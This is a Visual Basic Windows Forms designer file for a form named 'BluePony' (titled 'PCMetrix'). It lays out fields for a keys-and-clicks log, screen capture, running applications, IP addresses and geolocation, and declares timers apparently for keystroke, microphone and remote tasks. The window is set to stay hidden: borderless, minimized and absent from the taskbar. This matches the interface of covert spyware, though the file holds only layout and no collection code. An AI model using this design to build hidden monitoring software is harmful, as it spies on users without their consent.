<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class BluePony
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        components = New ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(BluePony))
        KeysT = New Timer(components)
        KeyCountLabel = New Label()
        ClickCountLabel = New Label()
        ScreenT = New Timer(components)
        ScreenCaptureLabel = New Label()
        UserNameLabel = New Label()
        ApplicationList = New TextBox()
        AppsT = New Timer(components)
        ApplicationsRunningLabel = New Label()
        DeviceRunTimeLabel = New Label()
        DeviceT = New Timer(components)
        LogT = New Timer(components)
        KeysAndClicksLog = New TextBox()
        KeysLogLabel = New Label()
        LANT = New Timer(components)
        DeviceIPv4LANAddress = New TextBox()
        DeviceIPv4LANAddressLabel = New Label()
        ReportT = New Timer(components)
        ExternalLabel = New Label()
        InformationLabel = New Label()
        DeviceLabel = New Label()
        DomainLabel = New Label()
        OSNameLabel = New Label()
        OSPlatformLabel = New Label()
        OSVersionLabel = New Label()
        DrivesLabel = New Label()
        DrivesInUse = New TextBox()
        DrivesT = New Timer(components)
        RecentLabel = New Label()
        RecentActivity = New TextBox()
        RecentT = New Timer(components)
        DirT = New Timer(components)
        DirList = New TextBox()
        DirListLabel = New Label()
        CLT = New Timer(components)
        PST = New Timer(components)
        LoadT = New Timer(components)
        CopyT = New Timer(components)
        MicT = New Timer(components)
        WANT = New Timer(components)
        DeviceGeoNameLabel = New Label()
        DeviceIPv4WANAddressLabel = New Label()
        DeviceGeoLocationLabel = New Label()
        RemoteT = New Timer(components)
        SuspendLayout()
        ' 
        ' KeysT
        ' 
        KeysT.Enabled = True
        ' 
        ' KeyCountLabel
        ' 
        KeyCountLabel.AutoSize = True
        KeyCountLabel.BackColor = Color.Black
        KeyCountLabel.ForeColor = Color.Gold
        KeyCountLabel.Location = New Point(9, 6)
        KeyCountLabel.Margin = New Padding(2, 0, 2, 0)
        KeyCountLabel.Name = "KeyCountLabel"
        KeyCountLabel.Size = New Size(68, 15)
        KeyCountLabel.TabIndex = 0
        KeyCountLabel.Text = "Key Count: "
        ' 
        ' ClickCountLabel
        ' 
        ClickCountLabel.AutoSize = True
        ClickCountLabel.BackColor = Color.Black
        ClickCountLabel.ForeColor = Color.Gold
        ClickCountLabel.Location = New Point(9, 21)
        ClickCountLabel.Margin = New Padding(2, 0, 2, 0)
        ClickCountLabel.Name = "ClickCountLabel"
        ClickCountLabel.Size = New Size(75, 15)
        ClickCountLabel.TabIndex = 1
        ClickCountLabel.Text = "Click Count: "
        ' 
        ' ScreenT
        ' 
        ScreenT.Enabled = True
        ScreenT.Interval = 30000
        ' 
        ' ScreenCaptureLabel
        ' 
        ScreenCaptureLabel.AutoSize = True
        ScreenCaptureLabel.BackColor = Color.Black
        ScreenCaptureLabel.ForeColor = Color.Gold
        ScreenCaptureLabel.Location = New Point(293, 203)
        ScreenCaptureLabel.Margin = New Padding(2, 0, 2, 0)
        ScreenCaptureLabel.Name = "ScreenCaptureLabel"
        ScreenCaptureLabel.Size = New Size(93, 15)
        ScreenCaptureLabel.TabIndex = 14
        ScreenCaptureLabel.Text = "Screen Capture: "
        ' 
        ' UserNameLabel
        ' 
        UserNameLabel.AutoSize = True
        UserNameLabel.BackColor = Color.Black
        UserNameLabel.ForeColor = Color.Gold
        UserNameLabel.Location = New Point(9, 36)
        UserNameLabel.Margin = New Padding(2, 0, 2, 0)
        UserNameLabel.Name = "UserNameLabel"
        UserNameLabel.Size = New Size(71, 15)
        UserNameLabel.TabIndex = 4
        UserNameLabel.Text = "User Name: "
        ' 
        ' ApplicationList
        ' 
        ApplicationList.BackColor = Color.Black
        ApplicationList.BorderStyle = BorderStyle.None
        ApplicationList.ForeColor = Color.Gold
        ApplicationList.Location = New Point(9, 97)
        ApplicationList.Margin = New Padding(2)
        ApplicationList.Multiline = True
        ApplicationList.Name = "ApplicationList"
        ApplicationList.ReadOnly = True
        ApplicationList.Size = New Size(280, 42)
        ApplicationList.TabIndex = 7
        ' 
        ' AppsT
        ' 
        AppsT.Enabled = True
        AppsT.Interval = 180000
        ' 
        ' ApplicationsRunningLabel
        ' 
        ApplicationsRunningLabel.AutoSize = True
        ApplicationsRunningLabel.BackColor = Color.Black
        ApplicationsRunningLabel.ForeColor = Color.Gold
        ApplicationsRunningLabel.Location = New Point(9, 81)
        ApplicationsRunningLabel.Margin = New Padding(2, 0, 2, 0)
        ApplicationsRunningLabel.Name = "ApplicationsRunningLabel"
        ApplicationsRunningLabel.Size = New Size(124, 15)
        ApplicationsRunningLabel.TabIndex = 6
        ApplicationsRunningLabel.Text = "Applications Running:"
        ' 
        ' DeviceRunTimeLabel
        ' 
        DeviceRunTimeLabel.AutoSize = True
        DeviceRunTimeLabel.BackColor = Color.Black
        DeviceRunTimeLabel.ForeColor = Color.Gold
        DeviceRunTimeLabel.Location = New Point(9, 51)
        DeviceRunTimeLabel.Margin = New Padding(2, 0, 2, 0)
        DeviceRunTimeLabel.Name = "DeviceRunTimeLabel"
        DeviceRunTimeLabel.Size = New Size(102, 15)
        DeviceRunTimeLabel.TabIndex = 5
        DeviceRunTimeLabel.Text = "Device Run Time: "
        ' 
        ' DeviceT
        ' 
        DeviceT.Enabled = True
        DeviceT.Interval = 180000
        ' 
        ' LogT
        ' 
        LogT.Enabled = True
        LogT.Interval = 1
        ' 
        ' KeysAndClicksLog
        ' 
        KeysAndClicksLog.BackColor = Color.Black
        KeysAndClicksLog.BorderStyle = BorderStyle.None
        KeysAndClicksLog.ForeColor = Color.Gold
        KeysAndClicksLog.Location = New Point(293, 20)
        KeysAndClicksLog.Margin = New Padding(2)
        KeysAndClicksLog.Multiline = True
        KeysAndClicksLog.Name = "KeysAndClicksLog"
        KeysAndClicksLog.ReadOnly = True
        KeysAndClicksLog.Size = New Size(280, 42)
        KeysAndClicksLog.TabIndex = 13
        ' 
        ' KeysLogLabel
        ' 
        KeysLogLabel.AutoSize = True
        KeysLogLabel.BackColor = Color.Black
        KeysLogLabel.ForeColor = Color.Gold
        KeysLogLabel.Location = New Point(293, 6)
        KeysLogLabel.Margin = New Padding(2, 0, 2, 0)
        KeysLogLabel.Name = "KeysLogLabel"
        KeysLogLabel.Size = New Size(57, 15)
        KeysLogLabel.TabIndex = 12
        KeysLogLabel.Text = "Keys Log:"
        ' 
        ' LANT
        ' 
        LANT.Enabled = True
        LANT.Interval = 180000
        ' 
        ' DeviceIPv4LANAddress
        ' 
        DeviceIPv4LANAddress.BackColor = Color.Black
        DeviceIPv4LANAddress.BorderStyle = BorderStyle.None
        DeviceIPv4LANAddress.ForeColor = Color.Gold
        DeviceIPv4LANAddress.Location = New Point(9, 158)
        DeviceIPv4LANAddress.Margin = New Padding(2)
        DeviceIPv4LANAddress.Multiline = True
        DeviceIPv4LANAddress.Name = "DeviceIPv4LANAddress"
        DeviceIPv4LANAddress.ReadOnly = True
        DeviceIPv4LANAddress.Size = New Size(280, 42)
        DeviceIPv4LANAddress.TabIndex = 9
        ' 
        ' DeviceIPv4LANAddressLabel
        ' 
        DeviceIPv4LANAddressLabel.AutoSize = True
        DeviceIPv4LANAddressLabel.BackColor = Color.Black
        DeviceIPv4LANAddressLabel.ForeColor = Color.Gold
        DeviceIPv4LANAddressLabel.Location = New Point(9, 141)
        DeviceIPv4LANAddressLabel.Margin = New Padding(2, 0, 2, 0)
        DeviceIPv4LANAddressLabel.Name = "DeviceIPv4LANAddressLabel"
        DeviceIPv4LANAddressLabel.Size = New Size(144, 15)
        DeviceIPv4LANAddressLabel.TabIndex = 8
        DeviceIPv4LANAddressLabel.Text = "Device IPv4 LAN Address: "
        ' 
        ' ReportT
        ' 
        ReportT.Enabled = True
        ReportT.Interval = 180000
        ' 
        ' ExternalLabel
        ' 
        ExternalLabel.AutoSize = True
        ExternalLabel.BackColor = Color.Black
        ExternalLabel.ForeColor = Color.Gold
        ExternalLabel.Location = New Point(9, 66)
        ExternalLabel.Margin = New Padding(2, 0, 2, 0)
        ExternalLabel.Name = "ExternalLabel"
        ExternalLabel.Size = New Size(54, 15)
        ExternalLabel.TabIndex = 15
        ExternalLabel.Text = "External: "
        ' 
        ' InformationLabel
        ' 
        InformationLabel.AutoSize = True
        InformationLabel.BackColor = Color.Black
        InformationLabel.ForeColor = Color.Gold
        InformationLabel.Location = New Point(9, 262)
        InformationLabel.Margin = New Padding(2, 0, 2, 0)
        InformationLabel.Name = "InformationLabel"
        InformationLabel.Size = New Size(197, 15)
        InformationLabel.TabIndex = 16
        InformationLabel.Text = "© Copyright 2025 Elliot Monteverde"
        ' 
        ' DeviceLabel
        ' 
        DeviceLabel.AutoSize = True
        DeviceLabel.BackColor = Color.Black
        DeviceLabel.ForeColor = Color.Gold
        DeviceLabel.Location = New Point(293, 67)
        DeviceLabel.Margin = New Padding(2, 0, 2, 0)
        DeviceLabel.Name = "DeviceLabel"
        DeviceLabel.Size = New Size(83, 15)
        DeviceLabel.TabIndex = 17
        DeviceLabel.Text = "Device Name: "
        ' 
        ' DomainLabel
        ' 
        DomainLabel.AutoSize = True
        DomainLabel.BackColor = Color.Black
        DomainLabel.ForeColor = Color.Gold
        DomainLabel.Location = New Point(293, 82)
        DomainLabel.Margin = New Padding(2, 0, 2, 0)
        DomainLabel.Name = "DomainLabel"
        DomainLabel.Size = New Size(90, 15)
        DomainLabel.TabIndex = 18
        DomainLabel.Text = "Domain Name: "
        ' 
        ' OSNameLabel
        ' 
        OSNameLabel.AutoSize = True
        OSNameLabel.BackColor = Color.Black
        OSNameLabel.ForeColor = Color.Gold
        OSNameLabel.Location = New Point(293, 97)
        OSNameLabel.Margin = New Padding(2, 0, 2, 0)
        OSNameLabel.Name = "OSNameLabel"
        OSNameLabel.Size = New Size(63, 15)
        OSNameLabel.TabIndex = 19
        OSNameLabel.Text = "OS Name: "
        ' 
        ' OSPlatformLabel
        ' 
        OSPlatformLabel.AutoSize = True
        OSPlatformLabel.BackColor = Color.Black
        OSPlatformLabel.ForeColor = Color.Gold
        OSPlatformLabel.Location = New Point(293, 112)
        OSPlatformLabel.Margin = New Padding(2, 0, 2, 0)
        OSPlatformLabel.Name = "OSPlatformLabel"
        OSPlatformLabel.Size = New Size(77, 15)
        OSPlatformLabel.TabIndex = 20
        OSPlatformLabel.Text = "OS Platform: "
        ' 
        ' OSVersionLabel
        ' 
        OSVersionLabel.AutoSize = True
        OSVersionLabel.BackColor = Color.Black
        OSVersionLabel.ForeColor = Color.Gold
        OSVersionLabel.Location = New Point(293, 127)
        OSVersionLabel.Margin = New Padding(2, 0, 2, 0)
        OSVersionLabel.Name = "OSVersionLabel"
        OSVersionLabel.Size = New Size(69, 15)
        OSVersionLabel.TabIndex = 21
        OSVersionLabel.Text = "OS Version: "
        ' 
        ' DrivesLabel
        ' 
        DrivesLabel.AutoSize = True
        DrivesLabel.BackColor = Color.Black
        DrivesLabel.ForeColor = Color.Gold
        DrivesLabel.Location = New Point(293, 142)
        DrivesLabel.Margin = New Padding(2, 0, 2, 0)
        DrivesLabel.Name = "DrivesLabel"
        DrivesLabel.Size = New Size(80, 15)
        DrivesLabel.TabIndex = 22
        DrivesLabel.Text = "Drives In Use: "
        ' 
        ' DrivesInUse
        ' 
        DrivesInUse.BackColor = Color.Black
        DrivesInUse.BorderStyle = BorderStyle.None
        DrivesInUse.ForeColor = Color.Gold
        DrivesInUse.Location = New Point(293, 159)
        DrivesInUse.Margin = New Padding(2)
        DrivesInUse.Multiline = True
        DrivesInUse.Name = "DrivesInUse"
        DrivesInUse.ReadOnly = True
        DrivesInUse.Size = New Size(280, 42)
        DrivesInUse.TabIndex = 23
        ' 
        ' DrivesT
        ' 
        DrivesT.Enabled = True
        DrivesT.Interval = 180000
        ' 
        ' RecentLabel
        ' 
        RecentLabel.AutoSize = True
        RecentLabel.BackColor = Color.Black
        RecentLabel.ForeColor = Color.Gold
        RecentLabel.Location = New Point(293, 218)
        RecentLabel.Margin = New Padding(2, 0, 2, 0)
        RecentLabel.Name = "RecentLabel"
        RecentLabel.Size = New Size(92, 15)
        RecentLabel.TabIndex = 24
        RecentLabel.Text = "Recent Activity: "
        ' 
        ' RecentActivity
        ' 
        RecentActivity.BackColor = Color.Black
        RecentActivity.BorderStyle = BorderStyle.None
        RecentActivity.ForeColor = Color.Gold
        RecentActivity.Location = New Point(293, 235)
        RecentActivity.Margin = New Padding(2)
        RecentActivity.Multiline = True
        RecentActivity.Name = "RecentActivity"
        RecentActivity.ReadOnly = True
        RecentActivity.Size = New Size(280, 42)
        RecentActivity.TabIndex = 25
        ' 
        ' RecentT
        ' 
        RecentT.Enabled = True
        RecentT.Interval = 180000
        ' 
        ' DirT
        ' 
        DirT.Enabled = True
        DirT.Interval = 180000
        ' 
        ' DirList
        ' 
        DirList.BackColor = Color.Black
        DirList.BorderStyle = BorderStyle.None
        DirList.ForeColor = Color.Gold
        DirList.Location = New Point(577, 20)
        DirList.Margin = New Padding(2)
        DirList.Multiline = True
        DirList.Name = "DirList"
        DirList.ReadOnly = True
        DirList.Size = New Size(280, 42)
        DirList.TabIndex = 27
        ' 
        ' DirListLabel
        ' 
        DirListLabel.AutoSize = True
        DirListLabel.BackColor = Color.Black
        DirListLabel.ForeColor = Color.Gold
        DirListLabel.Location = New Point(577, 6)
        DirListLabel.Margin = New Padding(2, 0, 2, 0)
        DirListLabel.Name = "DirListLabel"
        DirListLabel.Size = New Size(92, 15)
        DirListLabel.TabIndex = 26
        DirListLabel.Text = "Recent Activity: "
        ' 
        ' CLT
        ' 
        CLT.Enabled = True
        CLT.Interval = 30000
        ' 
        ' PST
        ' 
        PST.Enabled = True
        PST.Interval = 30000
        ' 
        ' LoadT
        ' 
        LoadT.Enabled = True
        LoadT.Interval = 300000
        ' 
        ' CopyT
        ' 
        CopyT.Enabled = True
        CopyT.Interval = 30000
        ' 
        ' MicT
        ' 
        MicT.Enabled = True
        MicT.Interval = 180000
        ' 
        ' WANT
        ' 
        WANT.Enabled = True
        WANT.Interval = 1800000
        ' 
        ' DeviceGeoNameLabel
        ' 
        DeviceGeoNameLabel.AutoSize = True
        DeviceGeoNameLabel.BackColor = Color.Black
        DeviceGeoNameLabel.ForeColor = Color.Gold
        DeviceGeoNameLabel.Location = New Point(9, 233)
        DeviceGeoNameLabel.Margin = New Padding(2, 0, 2, 0)
        DeviceGeoNameLabel.Name = "DeviceGeoNameLabel"
        DeviceGeoNameLabel.Size = New Size(132, 15)
        DeviceGeoNameLabel.TabIndex = 30
        DeviceGeoNameLabel.Text = "Device Location Name: "
        ' 
        ' DeviceIPv4WANAddressLabel
        ' 
        DeviceIPv4WANAddressLabel.AutoSize = True
        DeviceIPv4WANAddressLabel.BackColor = Color.Black
        DeviceIPv4WANAddressLabel.ForeColor = Color.Gold
        DeviceIPv4WANAddressLabel.Location = New Point(9, 203)
        DeviceIPv4WANAddressLabel.Margin = New Padding(2, 0, 2, 0)
        DeviceIPv4WANAddressLabel.Name = "DeviceIPv4WANAddressLabel"
        DeviceIPv4WANAddressLabel.Size = New Size(149, 15)
        DeviceIPv4WANAddressLabel.TabIndex = 28
        DeviceIPv4WANAddressLabel.Text = "Device IPv4 WAN Address: "
        ' 
        ' DeviceGeoLocationLabel
        ' 
        DeviceGeoLocationLabel.AutoSize = True
        DeviceGeoLocationLabel.BackColor = Color.Black
        DeviceGeoLocationLabel.ForeColor = Color.Gold
        DeviceGeoLocationLabel.Location = New Point(9, 218)
        DeviceGeoLocationLabel.Margin = New Padding(2, 0, 2, 0)
        DeviceGeoLocationLabel.Name = "DeviceGeoLocationLabel"
        DeviceGeoLocationLabel.Size = New Size(176, 15)
        DeviceGeoLocationLabel.TabIndex = 29
        DeviceGeoLocationLabel.Text = "Device Latitude And Longitude: "
        ' 
        ' RemoteT
        ' 
        RemoteT.Enabled = True
        RemoteT.Interval = 900000
        ' 
        ' BluePony
        ' 
        AutoScaleDimensions = New SizeF(7F, 15F)
        AutoScaleMode = AutoScaleMode.Font
        BackColor = Color.Black
        ClientSize = New Size(865, 285)
        ControlBox = False
        Controls.Add(DeviceGeoNameLabel)
        Controls.Add(DeviceIPv4WANAddressLabel)
        Controls.Add(DeviceGeoLocationLabel)
        Controls.Add(DirList)
        Controls.Add(DirListLabel)
        Controls.Add(RecentActivity)
        Controls.Add(RecentLabel)
        Controls.Add(DrivesInUse)
        Controls.Add(DrivesLabel)
        Controls.Add(OSVersionLabel)
        Controls.Add(OSPlatformLabel)
        Controls.Add(OSNameLabel)
        Controls.Add(DomainLabel)
        Controls.Add(DeviceLabel)
        Controls.Add(InformationLabel)
        Controls.Add(ExternalLabel)
        Controls.Add(DeviceIPv4LANAddressLabel)
        Controls.Add(DeviceIPv4LANAddress)
        Controls.Add(KeysLogLabel)
        Controls.Add(KeysAndClicksLog)
        Controls.Add(DeviceRunTimeLabel)
        Controls.Add(ApplicationsRunningLabel)
        Controls.Add(ApplicationList)
        Controls.Add(UserNameLabel)
        Controls.Add(ScreenCaptureLabel)
        Controls.Add(ClickCountLabel)
        Controls.Add(KeyCountLabel)
        FormBorderStyle = FormBorderStyle.None
        Icon = CType(resources.GetObject("$this.Icon"), Icon)
        Margin = New Padding(2)
        MaximizeBox = False
        MinimizeBox = False
        Name = "BluePony"
        ShowIcon = False
        ShowInTaskbar = False
        StartPosition = FormStartPosition.CenterScreen
        Text = "PCMetrix"
        WindowState = FormWindowState.Minimized
        ResumeLayout(False)
        PerformLayout()
    End Sub

    Friend WithEvents KeysT As Timer
    Friend WithEvents KeyCountLabel As Label
    Friend WithEvents ClickCountLabel As Label
    Friend WithEvents ScreenT As Timer
    Friend WithEvents ScreenCaptureLabel As Label
    Friend WithEvents UserNameLabel As Label
    Friend WithEvents ApplicationList As TextBox
    Friend WithEvents AppsT As Timer
    Friend WithEvents ApplicationsRunningLabel As Label
    Friend WithEvents DeviceRunTimeLabel As Label
    Friend WithEvents DeviceT As Timer
    Friend WithEvents LogT As Timer
    Friend WithEvents KeysAndClicksLog As TextBox
    Friend WithEvents KeysLogLabel As Label
    Friend WithEvents LANT As Timer
    Friend WithEvents DeviceIPv4LANAddress As TextBox
    Friend WithEvents DeviceIPv4LANAddressLabel As Label
    Friend WithEvents ReportT As Timer
    Friend WithEvents ExternalLabel As Label
    Friend WithEvents InformationLabel As Label
    Friend WithEvents DeviceLabel As Label
    Friend WithEvents DomainLabel As Label
    Friend WithEvents OSNameLabel As Label
    Friend WithEvents OSPlatformLabel As Label
    Friend WithEvents OSVersionLabel As Label
    Friend WithEvents DrivesLabel As Label
    Friend WithEvents DrivesInUse As TextBox
    Friend WithEvents DrivesT As Timer
    Friend WithEvents RecentLabel As Label
    Friend WithEvents RecentActivity As TextBox
    Friend WithEvents RecentT As Timer
    Friend WithEvents DirT As Timer
    Friend WithEvents DirList As TextBox
    Friend WithEvents DirListLabel As Label
    Friend WithEvents CLT As Timer
    Friend WithEvents PST As Timer
    Friend WithEvents LoadT As Timer
    Friend WithEvents CopyT As Timer
    Friend WithEvents MicT As Timer
    Friend WithEvents WANT As Timer
    Friend WithEvents DeviceGeoNameLabel As Label
    Friend WithEvents DeviceIPv4WANAddressLabel As Label
    Friend WithEvents DeviceGeoLocationLabel As Label
    Friend WithEvents RemoteT As Timer

End Class
